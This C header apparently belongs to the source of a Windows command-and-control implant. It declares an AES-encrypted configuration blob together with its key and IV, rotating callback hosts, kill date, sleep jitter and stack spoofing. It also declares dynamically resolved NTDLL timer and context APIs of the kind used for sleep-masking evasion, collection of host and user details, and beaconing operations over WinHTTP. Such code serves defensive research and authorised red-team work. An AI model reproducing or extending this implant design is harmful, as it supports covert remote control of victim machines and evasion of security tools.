#pragma once
#include "Common/Common.h"

#define AGENT_MAGIC_VALUE 0x0041153C //allsec in l33t speak.
//config bytes
#define CONFIG_BYTES {0x18,0xc2,0x04,0xd8,0x29,0x24,0xaa,0x5f,0xee,0x0b,0x32,0x9b,0x45,0xff,0xf1,0x6b,0x54,0x5c,0x0e,0xd8,0xd0,0x44,0x4f,0xc3,0xf7,0xb9,0xe4,0xe5,0xdd,0xa8,0xa8,0x98,0x08,0x1e,0x2b,0x17,0xb2,0x5c,0x06,0x2b,0x29,0x1a,0x71,0x78,0x8f,0x0b,0x2c,0xf0,0xfd,0xa1,0xde,0x0b,0xf3,0x74,0xf1,0xa6,0x8d,0x3a,0xe5,0xfd,0x94,0x83,0xb3,0x88,0x87,0xec,0xfc,0x1a,0xba,0x99,0x1f,0xe2,0x82,0xce,0xeb,0x42,0x1c,0x6f,0x8e,0xb9,0x15,0x37,0x31,0x8d,0x79,0x78,0x46,0x5e,0xb2,0xea,0xf2,0x40,0xfc,0x7c,0xc8,0xc2,0x33,0x50,0xea,0x54,0xbc,0x61,0xdc,0xb2,0xcb,0x20,0xfe,0xa5,0xd7,0x84,0xf1,0x9f,0x5f,0xfb,0x15,0xe9,0xc4,0x81,0xe5,0x4f,0x33,0xd0,0x31,0x0d,0xc0,0xa7,0xbc,0x13,0x58,0x8d,0x48,0x75,0xa8,0x4f,0x74,0xb1,0xd1,0xdb,0xe7,0xee,0xc4,0x11,0x1d,0xf8,0x47,0xa2,0xe9,0x4e,0xa3,0x6a,0xfe,0x81,0xd7,0x60,0x77,0x52,0x06,0x94,0xba,0x2d,0xf6,0x91,0xe7,0x96,0x16,0x94,0x75,0x02,0x12,0x34,0x4d,0xe2,0x32,0x03,0xdc,0xa6,0x4f,0xfa,0x3f,0x55,0x3c,0x12,0xa9,0xc4,0x83,0x81,0xa6,0x83,0xb2,0x65,0xda,0xb9,0x9c,0x70,0xd4,0xe4,0x58,0x10,0xc6,0xc9,0x2c,0xac,0xa1,0x7e,0x8c,0x34,0x21,0xff,0x00,0x76,0x5b,0x26,0x47,0xb2,0x1b,0x22,0x6b,0x79,0xb7,0x13,0xfb,0x85,0x6f,0xd4,0x89,0xb7,0x67,0x5c,0x14,0x56,0x26,0xaa,0x73,0x88,0x40,0x56,0x70,0x5a,0x9f,0x28,0xda,0xaa,0xf6,0x3d,0x08,0xdf,0x41,0xa2,0x4b,0x4c,0x12,0xc0,0xb8,0xcd,0xe3,0x99,0x31,0xb3,0x77,0x91,0x94,0x7b,0x3c,0x56,0x52,0x03,0xd8,0xbd,0x79,0x1d,0x81,0x75,0x61,0x5d,0xbb,0xf0,0x5f,0x61,0xef,0xe9,0xd5,0x03,0x22,0xaf,0xc8,0xfa,0x34,0x61,0x90,0xa3,0x2a,0xf7,0x61,0x0b,0xe8,0xf0,0x1c,0x0a,0x1f,0xe8,0x5a,0x63,0xf9,0x80,0xc7,0x88,0x3b,0x24,0xc5,0xa9,0x68,0x88,0xb2,0xa1,0x47,0x88,0x5f,0x90,0x60,0x5a,0x95,0x53,0x24,0x38,0x86,0x63,0x85,0x2b,0x2a,0x16,0xb5,0xc7,0xd5,0x3a,0xaf,0x76,0xd1,0x05,0xbe,0x82,0x49,0xc5,0xb7,0x6e,0xe4,0xeb,0xc5,0xef,0x50,0x22,0x5d,0xcb,0xd8,0x29,0xa0,0x5b,0x0c,0x66,0x55,0x11,0xa0,0xf4,0x31,0xa5,0x10,0x3c,0xa9,0xfe,0xf9,0x35,0x9d,0xf2,0xfe,0xf4,0x58,0x26,0x3d,0xdf,0x6e,0x03,0x1f,0xaf,0xf2,0x55,0x36,0xcb,0xd9,0xfc,0xb0,0xd7,0x0a,0xd5,0xbe,0xb0,0xc4,0x84,0xc0,0x29,0x67,0xf7,0x3a,0x3e,0x34,0x3d,0xa4,0x3c,0x46,0x7d,0xab,0x6b,0x5e,0x43,0x71,0x83,0xa4,0xc2,0xa0,0x86,0x77,0x95,0x7b,0x6b,0xef,0x9e,0xa9,0x3c,0x0c,0x7d,0x59,0xfb,0x0e,0xe9,0xd3,0xac,0xec,0x16,0xe9,0xa1,0x6c,0x31,0x61,0xa0,0x32,0x54,0x19,0xad,0xf9,0xe4,0x75,0x13,0xfb,0x5a,0x3e,0x0e,0x41,0xab,0x7b,0xf1,0xbe,0x44,0xb3,0x5f,0xe5,0x33,0x16,0xbf,0x6b,0x8a,0x35,0xe0,0x14,0x18,0xb8,0x41,0xa7,0xa4,0x9f,0x7b,0xae,0x1a,0xb7,0x3a,0x4b,0x1f,0xb3,0xda,0xd7,0x57,0x25,0x50,0x19,0x12,0x96,0x83,0xcc,0x2f,0xc9,0x06,0x2c,0x29,0xe9,0xd0,0x1f,0xdd,0xc1,0x2e,0x2e,0xd7,0xa6,0x9f,0x36,0xd5,0xb5,0x7b,0xb0,0xe7,0x0a,0x9d,0x85,0x4d,0xf6,0x4a,0x92,0x4b,0xaf,0xc6,0xdc,0xee,0xe7,0xb5,0x73,0x7f,0xe1,0xef,0xba,0x59,0xcb,0xc9,0xf1,0xd9,0x86,0xca,0xd0,0x90,0x11,0x27,0x93,0xc8,0xfc,0xc1,0x12,0x2d,0x98,0x32,0x2a,0x25,0xa6,0xc6,0x0e,0xbf,0xb4,0xeb,0xa6,0xdf,0xb8,0xf4,0x47,0x15,0xdf,0xff,0xb8,0xef,0x7d,0x45,0xfc,0x19,0xdd,0x95,0x91,0x21,0xbc,0xa7,0x8d,0xca,0x77,0x86,0x5c,0x4d,0xef,0xb5,0xc0,0x47,0x8d,0xbe,0x2b,0x5b,0x01,0x32,0x1c,0xd7,0x19,0xc9,0x39,0x22,0x30,0x0e,0x38,0x36,0x42,0x27,0x24,0x5d,0xdd,0xa7,0xfa,0x99,0x5a,0xc6,0xfa,0x74,0x85,0x05,0xf4,0x7f,0x89,0x9f,0x67,0x2e,0x38,0x89,0x64,0x74,0xcb,0xa2,0x36,0x4f,0x55,0x92,0x4a,0x03,0x6c,0x59,0x23,0x74,0x99,0x1d,0x03,0x47,0x5b,0xe0,0x36,0xec,0xab,0x2f,0x8d,0x87,0x8f,0x99,0x78,0x43,0xb6,0x16,0x43,0x76,0x2a,0xd0,0x85,0xae,0xa3,0x72,0xd8,0x60,0x73,0x91,0xd4,0x2f,0x24,0x87,0x2e,0xb5,0x05,0x9d,0x2d,0x28,0x24,0x22,0xc6,0xd1,0x5a,0x4f,0x7f,0x70,0x62,0xe6,0x48,0x1e,0x4c,0x8c,0x55,0xaa,0x43,0xd2,0x20,0x02,0x20}
 #define CONFIG_KEY_BYTES {0x7c,0x86,0x4d,0x78,0x9f,0x56,0xcc,0x31,0x65,0x22,0xf8,0x78,0x46,0x75,0x50,0xa2,0xb5,0x74,0x0b,0x4c,0xb4,0xde,0x76,0x6d,0x19,0xa3,0x4a,0x0d,0xeb,0x4f,0xff,0x02}
 #define CONFIG_IV_BYTES {0x93,0xab,0x79,0xcd,0xbe,0x6d,0x46,0x9d,0x74,0xe3,0xba,0x33,0x0a,0x3c,0x10,0x0c}
 #define HASH_CONFIG_BYTES {0x8f,0xa5,0xc0,0x7c,0x82,0xa7,0xe3,0x7a,0x95,0x3c,0xf3,0x3d,0xf2,0x66,0x3b,0xf3,0xc2,0x35,0xaf,0xbf,0x88,0x2f,0x16,0xab,0xe4,0x02,0xf6,0xd9,0x60,0xc7,0x88,0xf0,0xc4,0xae,0xef,0xc8,0x46,0x9d,0x68,0xb1,0x28,0x0e,0xb9,0x54,0x44,0x93,0x5a,0xbb,0xa9,0x36,0x4c,0xd4,0x99,0x3d,0xc7,0x8f,0x48,0xb6,0xf0,0xeb,0xf6,0x67,0x94,0x6e,0x01,0xa7,0x35,0xa7,0x51,0x83,0xae,0xbf,0x94,0xf2,0xe3,0xb7,0xb2,0xc3,0x5d,0x5f,0x09,0x74,0x75,0x96,0xf2,0x09,0x7b,0xc3,0x9d,0xfe,0xc6,0x0f,0xaa,0x26,0x8a,0x91,0x66,0xe8,0x1b,0x58,0x37,0xb1,0x8c,0x9a,0xc9,0xe7,0x43,0x1d,0x58,0x51,0xb4,0x5f,0x77,0x19,0x9f,0x40,0xc2,0xa1,0xb4,0x49,0x63,0xff,0x9d,0xa5,0xa0,0x15,0x12,0xe5,0x65,0x7b,0x28,0xce,0x12,0xa4,0x7d,0xd2,0x13,0xea,0x2c,0x05,0xcb,0x41,0xd6,0xb0,0xc9,0xce,0x33,0xd2,0xbc,0x0d,0xe9,0x6e,0xfc,0x90,0x0d,0xdc,0x44,0xae,0xdc,0x26,0x52,0x6e,0x42,0x2d,0xcf,0xa3,0xfa,0xa4,0x8c,0xc8,0x2f,0xa2,0x5e,0x51,0xef,0x6e,0xe4,0x23,0xb6,0xc6,0xa1,0x63,0xfa,0x29,0xf2,0xe7,0xeb,0xa7,0xc4,0xf9,0x02,0x12,0x0d,0x82,0x10,0x50,0xa7,0x8d,0xc1,0xad,0x59,0x7f,0x21,0xa0,0x34,0x2a,0x51,0x47,0xfe,0x00,0x5d,0xce,0x8d,0xdd,0x41,0xcd,0xd1,0xfc,0xb7,0xee,0x08,0x2f,0xc9,0xe5,0x1e,0xb0,0x64,0xe6,0x44,0xc0,0xe1,0x22,0x6f,0xe1,0xbe,0xe8,0x2d,0xac,0x37,0x6c,0x75,0x43,0xd8,0xff,0xfd,0xfa,0xde,0x95,0x51,0x71,0x2e,0x18,0xdb,0xb3,0x0c,0x57,0x23,0xfe,0x2e,0x4a,0x82,0x01,0xfe,0xb9,0xea,0xf7,0xb5,0x55,0x86,0x09,0x5e,0x27,0xdc,0xee,0x7c,0xe9,0xfa,0x32,0xc2,0x06,0x47,0x77,0xf0,0x41,0xd3,0xaf,0x25,0xd1,0xc5,0xd5,0x7c,0x8d,0x97,0x18,0x6e,0x77,0x57,0xb2,0x53,0x3b,0xe8,0x84,0x57,0x91,0xea,0x6a,0xaf,0x48,0xb1,0xd4,0x11,0x32,0x0c,0x00,0x87,0x21,0xec,0xee,0x14,0xdb,0x9f,0xae,0x0d,0xe0,0x01,0x20,0xc4,0x9f,0x29,0x7e,0xf6,0xcf,0x4c,0xe9,0xe9,0xae,0xd9,0x43,0x28,0xf4,0x43,0xab,0x7a,0x8a,0x44,0xe0,0xb3,0x35,0xd7,0xd7,0x75,0xd2,0xa5,0x32,0x8c,0x77,0x9a,0x2a,0x8e,0xb5,0xb5,0x08,0xf9,0x4a,0x2c,0x90,0x11,0x28,0x29,0xff,0x22,0xaf,0x0b,0x4b,0x94,0xe2,0x83,0x1e,0xbc,0xd5,0xd1,0x2b,0x34,0x1b,0x07,0x7a,0x49,0xf7,0xed,0x46,0x18,0xf2,0xe6,0xc1,0xb4,0xc6,0xee,0x2e,0x85,0x50,0xe8,0x91,0xb2,0xcd,0x24,0x66,0xda,0x49,0x20,0x57,0xee,0x94,0x1e,0xbd,0x3b,0x72,0xd4,0x36,0x95,0x69,0x2a,0xdc,0x30,0xe4,0x13,0x0f,0x47,0x97,0xa1,0x5b,0x5a,0x83,0x20,0x74,0x2a,0x2e,0x0c,0x79,0x37,0xef,0x61,0x94,0xa4,0x34,0x38,0x58,0x96,0x7b,0x2e,0x57,0x1f,0x23,0x04,0xf2,0x2f,0xea,0xd1,0x53,0xf0,0xec,0xe7,0xaf,0xa3,0x99,0x85,0xe7,0x25,0x12,0x37,0x5c,0x9c,0x83,0x7c,0xcd,0x6d,0x46,0x84,0xfb,0x84,0x36,0x8a,0x2e,0xa4,0x77,0x65,0x3f,0xd4,0x16,0x63,0x95,0x50,0xb2,0x27,0xf3,0xca,0x22,0x8c,0x72,0x04,0xc2,0x09,0xbb,0xcb,0x1f,0x28,0xcc,0x28,0xd4,0x45,0x1a,0x9a,0x52,0x05,0x5e,0x01,0x00}
 #define HASH_KEY_BYTES {0x34,0x55,0xca,0xdd,0x01,0xaf,0x6d,0x8b,0x3e,0x39,0x9d,0xe8,0x8e,0xb2,0x3d,0x5a,0xec,0x48,0xd1,0x10,0xe7,0xa5,0x30,0x1c,0xfb,0x2f,0x8f,0x6a,0xb2,0xb9,0x42,0x3c}
#define HASH_IV_BYTES {0x75,0x4c,0x50,0x2b,0x94,0xc1,0x79,0x83,0xb3,0xe3,0x69,0xce,0xbc,0xa6,0x27,0x6e}

struct Packges; // forward declaration so it can be included in the packages.h header file w/o having to include packages.h here Causing cyclic dependencies.

typedef struct _ContextInfo {
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	WORD   wServicePackMajor;
	WORD   wServicePackMinor;
	WORD   wSuiteMask;
	BYTE  wProductType;
	LPSTR UserName;
	LPSTR ComputerName;
	LPSTR IPAddress[10][5];
	DWORD PID;
	DWORD TID;
	DWORD PPID;
	WORD OS_Arch;
	WORD Process_Arch;
	BOOL Elevated;
} ContextInfo, *PContextInfo ;



typedef struct _HostData {
	LPWSTR Host;
	INT Port;
	BOOL Alive;
	INT NumFailures;
	struct _HostData* Next;
} HostData, * pHostData;

typedef struct _ListenerConfig {
	DWORD HostRotation;
	pHostData Hosts;
	pHostData CurrentHost;
	UINT NumHosts;
	DWORD Port;
	BOOL Secure;
	LPWSTR Method;
	LPWSTR* Headers;
	LPWSTR UserAgent;

} ListenerConfig, *pListenerConfig;

//TODO FINISH ADDING LISTENER / AGENT CONFIG DATA/
typedef struct _AgentConfig {

	UINT64 KillDate;
	UINT32 WorkingHours;
	UINT32 SleepTime;
	UINT32 SleepJitter;
	DWORD AgentID;
	BYTE* RSAPubKey;
	DWORD RSAPubKeySize;
	LPSTR AgentName;
	pListenerConfig listenerConfig;
	BOOL StackSpoof;

} AgentConfig, *PAgentConfig;

typedef struct _HttpSession {
	BOOL Active;
} HttpSession, *pHttpSession;


typedef struct _Win32 {
	//enumeration apis
	//NTDLL APIS
	HMODULE hNtdll;
	t_RtlGetVersion pRtlGetVersion;
	t_NtClose pNtClose;
	t_NtOpenProcessToken pNtOpenProcessToken;
	t_NtOpenThreadToken pNtOpenThreadToken;
	t_NtQueryInformationToken pNtQueryInformationToken;
	t_RtlAllocateHeap pRtlAllocateHeap;
	t_RtlReAllocateHeap pRtlReAllocateHeap;
	t_RtlRandomEx pRtlRandomEx;
	t_NtGetTickCount pNtGetTickCount;
	t_RtlCreateTimerQueue pRtlCreateTimerQueue;
	t_NtCreateEvent pNtCreateEvent;
	t_RtlCaptureContext pRtlCaptureContext;
	t_RtlCreateTimer pRtlCreateTimer;
	t_RtlRegisterWait pRtlRegisterWait;
	t_RtlDeleteTimerQueue pRtlDeleteTimerQueue;
	t_RtlCopyMappedMemory pRtlCopyMappedMemory;
	t_NtWaitForSingleObject pNtWaitForSingleObject;
	t_NtSignalAndWaitForSingleObject pNtSignalAndWaitForSingleObject;
	t_NtContinue pNtContinue;
	t_NtSetEvent pNtSetEvent;
	t_NtSetContextThread pNtSetContextThread;
	t_NtDuplicateObject pNtDuplicateObject;
	t_LdrGetProcedureAddress pLdrGetProcedureAddress;
	t_NtQueryVirtualMemory pNtQueryVirtualMemory;
	UINT64 RtlUserThreadStartHash;


	//KERNEL32 APIS
	HMODULE hKernel32;
	t_GetComputerNameExA pGetComputerNameExA;
	t_LocalAlloc pLocalAlloc;
	t_LocalReAlloc pLocalReAlloc;
	t_LocalFree pLocalFree;
	t_GetSystemTimeAsFileTime pGetSystemTimeAsFileTime;
	t_GetLocalTime pGetLocalTime;
	t_LoadLibraryA pLoadLibraryA;
	t_GetProcAddress pGetProcAddress;
	t_VirtualProtect pVirtualProtect;
	t_WaitForSingleObjectEx pWaitForSingleObjectEx;

	//ADVAPI APIS
	HMODULE hAdvapi32;
	t_GetUserNameA pGetUserNameA;
	t_SystemFunction032 pSystemFunction032;
	HMODULE hCryptSp;

	//USER32 APIS
	HMODULE hUser32;
	t_GetSystemMetrics pGetSystemMetrics;

	//IPHLPAPI APIS'
	HMODULE hIphlpapi;
	t_GetAdaptersInfo pGetAdaptersInfo;

	//http request APIS
	//WINHTTP APIS
	HMODULE hWinHttp;
	t_WinHttpOpen pWinHttpOpen;
	t_WinHttpConnect pWinHttpConnect;
	t_WinHttpOpenRequest pWinHttpOpenRequest;
	t_WinHttpSendRequest pWinHttpSendRequest;
	t_WinHttpReceiveResponse pWinHttpReceiveResponse;
	t_WinHttpQueryHeaders pWinHttpQueryHeaders;
	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
	t_WinHttpSetOption pWinHttpSetOption;
	t_WinHttpReadData pWinHttpReadData;
	t_WinHttpCloseHandle pWinHttpCloseHandle;

	//Kernelbase APIS
	HMODULE hKernelBase;
	UINT64 BaseThreadInitThunkHash;

} Win32, * pWin32;

typedef struct _AgentCMD {
	UINT CommandID;
	UINT RequestID;
	BYTE* DATA;
} AgentCMD, * pAgentCMD;

//TODO clean up this structure.
//I.E. make strcutrues for module hanldes, function pointers, etc. and include them in this parent structure rather than all directly.
typedef struct _Agent {


	pWin32 apis;

	//agent configuration
	PAgentConfig config;

	//current context info
	PContextInfo Context;

	//Session Info
	pHttpSession session;

	//active threads
	BOOL ActiveThreads;

	//ImageBase Address
	PVOID ModuleBaseAddr;

	//Image Size
	DWORD ImageSize;

	//Number of Sections
	DWORD NumSections;

	P_INT_TEB pTeb;

	//crypto info.
	BYTE* AESKey;
	ULONG AESKeySize;
	BYTE* EncryptedAESKey;
	ULONG EncryptedAESKeySize;
	BYTE* IV;
	ULONG IVSize;
	BYTE* EncryptedIV;
	ULONG EncryptedIVSize;

	struct _Package* MetaDataPackage;
	struct _Package* packages;


}Agent, * pAgent;


extern pAgent agent;

typedef enum  {
	REGISTER_AGENT = 0,
	EXIT_AGENT,
	SLEEP_AGENT,
	GET_AGENT_JOB,
	CHECKIN_AGENT,
	NO_JOB,
} Agent_Operations;


INT init_agent();
INT RegisterAgent();
void AgentMain();
INT ParseConfig();
BOOL ParseHashConfig();
void AgentRoutine();